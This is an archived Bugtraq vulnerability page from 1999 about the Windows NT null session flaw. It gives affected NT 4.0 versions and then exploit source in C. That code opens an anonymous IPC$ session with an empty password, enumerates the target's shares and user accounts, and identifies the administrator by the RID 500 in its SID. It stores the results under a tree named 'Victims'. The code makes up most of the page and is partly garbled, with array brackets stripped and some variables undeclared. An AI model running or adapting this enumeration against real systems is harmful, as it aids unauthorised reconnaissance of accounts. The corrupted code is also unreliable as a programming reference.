<p><b><span style="font-size: 18pt;">NT Null Session Admin Name Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/494/info">info</a><br><a href="http://www.securityfocus.com/bid/494/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/494/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/494/solution">solution</a><br><a href="http://www.securityfocus.com/bid/494/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				494
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Design Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Jun 28 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jun 28 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Vulnerability posted on June 28, 1999 to the NT OBJECTives web site by J D Glaser.
Solution emailed to SecurityFocus on June 30,1999 by Dustin Childs &lt;dustinc@hushmail.com&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Windows NT  4.0 SP5<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP5<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP4<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP4<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP3<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP3<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP2<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP2<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP1<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP1<br/>
</span>
					
				
					Microsoft Windows NT  4.0<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0<br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	First - making a  NULL Session connection<br/><br/>                        One way to this is by using the Net Use command with an empty password. Programmatically, it looks like this....<br/><br/>                        //This function called from dialog that fills listbox with connections<br/><br/>                        BOOL EstablishNullSession(CString TargetHost, CNTOHunterDlg* pDlg)<br/>                        {<br/>                        //Setup for UNICODE <br/>                        char* pTemp = TargetHost.GetBuffer(256);<br/>                        WCHAR wszServ256;<br/>                        LPWSTR Server = NULL;<br/><br/>                        //Convert to Unicode<br/>                        MultiByteToWideChar(CP_ACP, 0, pTemp,<br/>                                                strlen(pTemp)+1, wszServ,<br/>                                                sizeof(wszServ)/sizeof(wszServ0) );<br/><br/>                        //Create the IPC$ share connection string we need <br/>                        Server = wszServ;<br/><br/>                        LPCWSTR szIpc = L"\\IPC$";<br/>                        WCHAR RemoteResourceUNCLEN + 5 + 1; // UNC len + \IPC$ + NULL<br/>                        DWORD dwServNameLen;<br/>                        DWORD dwRC;<br/><br/>                        //Setup Win32 structures and variables we need<br/>                        NET_API_STATUS nas;<br/><br/>                        USE_INFO_2 ui2;<br/>                        SHARE_INFO_1* pSHInfo1 = NULL;<br/>                        DWORD            dwEntriesRead;<br/>                        DWORD            dwTotalEntries;<br/><br/>                        //Set up handles to tree control to insert connection results <br/><br/>                        HTREEITEM machineRoot, shareRoot, userRoot, adminRoot, attribRoot;<br/><br/>                        char sharename256;<br/>                        char remark256;<br/><br/>                        if(Server == NULL || *Server == L'\0')<br/>                        {<br/>                        SetLastError(ERROR_INVALID_COMPUTERNAME);<br/>                        return FALSE;<br/>                        }<br/><br/>                        dwServNameLen = lstrlenW( Server );<br/><br/>                        //Test for various errors in connection string and recover<br/>                        if(Server0 != L'\\' &amp;&amp; Server1 != L'\\')<br/>                        {<br/>                        // prepend slashes and NULL terminate<br/>                        RemoteResource0 = L'\\';<br/>                        RemoteResource1 = L'\\';<br/>                        RemoteResource2 = L'\0';<br/>                        }<br/>                        else<br/>                        {<br/>                        dwServNameLen -= 2; // drop slashes from count<br/>                        RemoteResource0 = L'\0';<br/>                        }<br/><br/>                        if(dwServNameLen &gt; CNLEN)<br/>                        {<br/>                        SetLastError(ERROR_INVALID_COMPUTERNAME);<br/>                        return FALSE;<br/>                        }<br/><br/>                        if(lstrcatW(RemoteResource, Server) == NULL) return FALSE;<br/>                        if(lstrcatW(RemoteResource, szIpc) == NULL) return FALSE;<br/>                        //Start with clean memory<br/>                        ZeroMemory(&amp;ui2, sizeof(ui2));<br/>                        //Fill in the Win32 network structure we need to use connect API<br/>                        ui2.ui2_local = NULL;<br/>                        ui2.ui2_remote = (LPTSTR) RemoteResource;<br/>                        ui2.ui2_asg_type = USE_IPC;<br/>                        ui2.ui2_password = (LPTSTR) L""; //SET PASSWORD TO NULL<br/>                                ui2.ui2_username = (LPTSTR) L"";<br/>                                ui2.ui2_domainname = (LPTSTR) L"";<br/><br/>                        //MAKE THE NULL SESSION CALL <br/>                        nas = NetUseAdd(NULL, 2, (LPBYTE)&amp;ui2, NULL);<br/><br/>                                dwRC = GetLastError();<br/>                                if( nas == NERR_Success ) <br/>                                {<br/>                                    machineRoot = pDlg-&gt;m_Victims.InsertItem(TargetHost, 0, 0,<br/>                                                                                                     TVI_ROOT);<br/>                                }<br/><br/>                        //THIS IS WHERE NT HANDS OUT IT INFORMATION<br/>                        nas = NetShareEnum((char*)Server, 1, (LPBYTE*)&amp;pSHInfo1,<br/>                                                MAX_PREFERRED_LENGTH, <br/>                                                &amp;dwEntriesRead, <br/>                                                &amp;dwTotalEntries, NULL);<br/><br/>                                dwRC = GetLastError();<br/>                                if( nas == NERR_Success ) <br/>                                {<br/>                                    if(dwTotalEntries &gt; 0)<br/>                                    {<br/>                                        shareRoot = pDlg-&gt;m_Victims.InsertItem("Shares",                                                 <br/>                        machineRoot,TVI_LAST);<br/>                                        userRoot = pDlg-&gt;m_Victims.InsertItem("Users",                                                 <br/>                        machineRoot,TVI_LAST);<br/>                                        adminRoot = pDlg-&gt;m_Victims.InsertItem("Admin",                                                  <br/>                        machineRoot,TVI_LAST);<br/><br/>                                    }<br/>                                    for(int x=0; x&lt;(int)dwTotalEntries; x++)<br/>                                    {<br/>                                        // Convert back to ANSI<br/>                                        WideCharToMultiByte(CP_ACP, 0, (const unsigned                                                 <br/>                        short*)pSHInfo1-&gt;shi1_netname, -1,<br/>                                                                        sharename, 256, NULL, NULL ); <br/><br/>                                        WideCharToMultiByte( CP_ACP, 0, (const unsigned                                             <br/>                        short*)pSHInfo1-&gt;shi1_remark, -1,<br/>                                                                        remark, 256, NULL, NULL ); <br/>                                        CString ShareDetails = sharename;<br/>                                        ShareDetails = ShareDetails + " - " + remark; <br/>                                        //fill the tree with connect info<br/>                                        attribRoot = pDlg-&gt;m_Victims.InsertItem(ShareDetails,                                                         <br/>                        shareRoot,TVI_LAST);<br/>                                        pSHInfo1++;<br/>                                    }<br/>                                }<br/><br/>                                //My Wrapper function for listing users - see below<br/>                                DoNetUserEnum(Server, pDlg, userRoot, adminRoot);<br/><br/>                        //WE ARE DONE, SO KILL THE CONNECTION<br/>                        nas = NetUseDel(NULL, (LPTSTR) RemoteResource, 0);<br/><br/>                        TargetHost.ReleaseBuffer();<br/>                        SetLastError( nas );<br/>                        return FALSE;<br/>                        }<br/><br/>                        The following function is how one can programmatically determine the administrator status of an account......<br/><br/>                        bool GetAdmin(char* pServer, char* pUser, CString&amp; Name)<br/>                        {<br/>                            BOOL fAdmin = FALSE;<br/>                            DWORD dwDomainName,dwSize,dwAdminVal;<br/>                            SID_NAME_USE use;<br/>                            PSID pUserSID = NULL; // SID for user<br/>                            int rc; <br/>                            int iSubCount;<br/><br/>                            bool bFoundHim = 0;<br/>                            dwDomainName = 256;<br/>                            dwSize = 0;<br/>                            dwAdminVal = 0;<br/>                            iSubCount = 0;<br/><br/>                            //Call API for buffer size since we don't know size beforehand<br/>                            rc = LookupAccountName(pServer, <br/>                                            pUser, pUserSID,<br/>                                            &amp;dwSize, szDomainName,<br/>                                            &amp;dwDomainName, &amp;use );<br/>                            rc = GetLastError();<br/><br/>                                    //Allocate a larger buffer<br/>                                    if(rc == ERROR_INSUFFICIENT_BUFFER)<br/>                                    {<br/>                                        pUserSID = (PSID) malloc(dwSize);<br/><br/>                                //Repeat call now that we have the right size buffer<br/>                                        rc = LookupAccountName(pServer,<br/>                                                            pUser, pUserSID,<br/>                                                            &amp;dwSize, szDomainName, <br/>                                                            &amp;dwDomainName, &amp;use );<br/>                                    } <br/> <br/>                        //Scan the SIDS for the golden key - ADMIN == 500 <br/><br/>                        //Get a count of SID's<br/>                        iSubCount = (int)*(GetSidSubAuthorityCount(pUserSID)); <br/>                        //Admin SID is the last element in the count<br/>                        dwAdminVal = *(GetSidSubAuthority(pUserSID, iSubCount-1));<br/><br/>                        if(dwAdminVal==500) //TEST TO SEE IF THIS IS THE ADMIN<br/>                            {<br/>                                Name.Format("Admin is %s\\%s\n", szDomainName, pUser);<br/>                                bFoundHim = true;<br/>                            }<br/><br/>                            delete pUserSID;<br/>                            return bFoundHim; //WE KNOW WHO HE IS, ADD HIM TO THE TREE<br/>                        }<br/><br/> <br/><br/>                        Wrapper for Listing the user accounts.....<br/><br/>                        void DoNetUserEnum(const wchar_t* pServer, CNTOHunterDlg* pDlg,                                  HTREEITEM<br/>                        userRoot, HTREEITEM adminRoot)<br/>                        {    <br/>                            USER_INFO_10 *pUserbuf, *pCurUser;<br/>                            DWORD dwRead, dwRemaining, dwResume, dwRC;<br/><br/>                            char userName256;<br/>                            char userServer256;<br/><br/>                            dwResume = 0;<br/><br/>                                    if(pServer0 != L'\\' &amp;&amp; pServer1 != L'\\')<br/>                                    {<br/>                                        //Start sting with correct UNC slashes and NULL terminate<br/>                                        RemoteResource0 = L'\\';<br/>                                        RemoteResource1 = L'\\';<br/>                                        RemoteResource2 = L'\0';<br/>                                    }<br/>                                    else<br/>                                    {<br/>                                        dwServNameLen -= 2; // drop slashes from count<br/><br/>                                        RemoteResource0 = L'\0';<br/>                                    }<br/><br/>                                    if(dwServNameLen &gt; CNLEN)<br/>                                    {<br/>                                        SetLastError(ERROR_INVALID_COMPUTERNAME);<br/>                                        return;<br/>                                    }<br/><br/>                                    if(lstrcatW(RemoteResource, pServer) == NULL) return;<br/><br/>                            do    <br/>                            {    <br/> <br/>                                pUserbuf = NULL;<br/><br/>                        //THIS IS THE API THE NT USES TO HAND OUT IT's LIST<br/>                                dwRC = NetUserEnum(RemoteResource, 10, 0, (BYTE**)                                          &amp;pUserbuf, 1024,<br/>                                                                &amp;dwRead, &amp;dwRemaining, &amp;dwResume);<br/>                                if (dwRC != ERROR_MORE_DATA &amp;&amp; dwRC != ERROR_SUCCESS)    <br/>                                    break;<br/><br/>                                DWORD i;<br/>                                for(i = 0, pCurUser = pUserbuf; i &lt; dwRead; ++i, ++pCurUser) <br/>                                {<br/><br/>                                        // Convert back to ANSI.<br/>                                        WideCharToMultiByte( CP_ACP, 0, pCurUser-&gt;usri10_name,                                                  -1,<br/>                        userName, 256, NULL, NULL ); <br/>                                        // Convert back to ANSI.<br/>                                        WideCharToMultiByte( CP_ACP, 0, pServer, -1,<br/>                                                userServer, 256, NULL, NULL ); <br/><br/>                        if(!GotAdmin)<br/>                                {<br/>                                //use char strings<br/>                                CString Admin;<br/>                                GotAdmin = GetAdmin(userServer, userName, Admin);<br/>                                if(GotAdmin)<br/>                                {<br/>                                    Admin.TrimRight();<br/>                                    HTREEITEM adminChild = pDlg-&gt;m_Victims.InsertItem(Admin,                                                         <br/>                        adminRoot, TVI_LAST);<br/>                                    pDlg-&gt;m_Victims.EnsureVisible(adminChild);<br/>                                }<br/>                                }<br/><br/>                                CString strUserName = userName;<br/>                                pDlg-&gt;m_Victims.InsertItem(strUserName, userRoot, TVI_LAST);<br/><br/>                                }<br/>                                if (pUserbuf != NULL)<br/>                                    NetApiBufferFree(pUserbuf);<br/>                            } while (dwRC == ERROR_MORE_DATA);<br/><br/>                            if (dwRC != ERROR_SUCCESS)<br/>                                printf("NUE() returned %lu\n", dwRC);<br/>                        }
	
		<ul>
</ul>
</div>